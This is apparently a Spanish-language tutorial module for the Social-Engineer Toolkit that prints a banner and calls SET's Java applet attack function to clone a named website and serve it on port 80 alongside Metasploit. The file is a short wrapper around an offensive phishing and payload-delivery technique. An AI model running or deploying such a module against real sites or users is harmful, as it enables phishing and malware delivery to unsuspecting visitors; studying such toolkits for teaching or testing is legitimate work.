#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

                        DESARROLLANDO MODULOS EN SET

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

"""""""""""""""""""""""""""""""""""""""""""""""""""
        CLONADOR DE PÁGINAS WEB
"""""""""""""""""""""""""""""""""""""""""""""""""""

import sys
from src.core.setcore import *

MAIN=" Clonador de páginas web "
AUTHOR=" Juan Velasco Gómez"

def main():

    print("\n")
    print("**********************************************************")
    print(" Clonar un sitio y iniciar un servidor web com metasploit ")
    print("**********************************************************")
    print("\n")

    java_applet_attack("http://fwhibbit.github.io/","80","thw/")
